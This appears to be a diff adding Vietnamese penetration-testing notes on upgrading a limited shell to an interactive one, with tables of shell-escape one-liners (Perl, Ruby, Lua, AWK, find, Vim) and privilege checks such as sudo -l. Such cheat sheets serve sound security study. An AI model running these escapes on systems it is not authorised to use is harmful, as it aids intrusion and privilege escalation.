@@ -1,0 +1,23 @@
+Spawn Interactive Shell là quá trình chuyển từ một shell hạn chế (limited shell) sang một interactive shell đầy đủ – giúp bạn:
+    Có prompt chuẩn, hỗ trợ history, tab-completion, job control.
+    Chạy được các lệnh như sudo -l, script, su, v.v.
+    Tăng tính ổn định khi khai thác và leo thang đặc quyền.
+  📌 Hiểu đơn giản: Spawn interactive shell = biến “cửa sổ shell cùi” thành “terminal xịn” để thao tác như đang ở máy thật.
+
+| **Kỹ Thuật**        | **Lệnh / Payload**                                                      | **Điều Kiện / Lưu Ý**                                        |
+| ------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------ |
+| **/bin/sh**         | `/bin/sh -i`                                                            | Cơ bản nhất, cần shell có sẵn `/bin/sh` hoặc `/bin/bash`.    |
+| **Perl**            | `perl -e 'exec "/bin/sh";'`                                             | Yêu cầu có Perl cài trên hệ thống. Có thể viết trong script. |
+| **Ruby**            | `ruby -e 'exec "/bin/sh"'`                                              | Cần Ruby cài trên hệ thống.                                  |
+| **Lua**             | `lua -e "os.execute('/bin/sh')"`                                        | Cần Lua. Thường có trên hệ thống dành cho scripting.         |
+| **AWK**             | `awk 'BEGIN {system("/bin/sh")}'`                                       | AWK có mặt mặc định trên hầu hết Unix/Linux.                 |
+| **Find + AWK**      | `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Dùng khi có quyền tìm kiếm file, kết hợp để chạy shell.      |
+| **Find trực tiếp**  | `find . -exec /bin/sh \; -quit`                                         | Chạy shell trực tiếp từ find, dừng sau khi thực thi.         |
+| **Vim (command)**   | `vim -c ':!/bin/sh'`                                                    | Thoát sang shell từ trong Vim.                               |
+| **Vim (set shell)** | `:set shell=/bin/sh` <br> `:shell`                                      | Dùng khi đã mở Vim.                                          |
+
+
+| **Kiểm Tra Quyền Hạn** | **Lệnh**                | **Ý Nghĩa**                                       |
+| ---------------------- | ----------------------- | ------------------------------------------------- |
+| **File Permission**    | `ls -la <path/to/file>` | Kiểm tra quyền thực thi và quyền đọc/ghi file.    |
+| **Sudo Quyền**         | `sudo -l`               | Xem quyền sudo, tìm khả năng leo thang đặc quyền. |
